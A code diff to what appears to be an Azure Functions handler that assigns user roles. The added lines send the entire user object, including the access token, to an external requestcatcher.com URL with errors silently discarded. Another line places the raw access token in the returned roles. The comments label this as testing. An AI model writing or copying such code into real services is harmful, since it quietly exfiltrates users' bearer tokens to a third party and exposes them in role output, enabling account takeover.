@@ -17,13 +17,28 @@ module.exports = async function (context, req) {
     // }
    
 
-     roles.push("testRole1"); // output test role for testing
+    roles.push("testRole1"); // output test role for testing
+
      //roles.push(btoa(JSON.stringify(user)));
-     roles.push(user.accessToken); // output accessToken to role for testing
-     if(user.email && user.email.includes("@microsoft.com")){
-        roles.push("microsoft");
-     }
-     roles.push("testRole2");
+    roles.push(user.accessToken); // output accessToken to role for testing
+     
+    // try post data to online test
+    var postUrl = 'https://mytest1.requestcatcher.com/';
+    var data = user
+    fetch(postUrl, {
+        method: 'POST', // or 'PUT'
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+    })
+    .then(res => res.text())
+    .catch(() => {
+        //console.error('Error:', error);
+    });
+    // end post data
+
+    roles.push("testRole2");
 
     // for (const [role, groupId] of Object.entries(roleAppRoleMapping)) {
     //     if (await isUserInRole(groupId, user.accessToken)) {
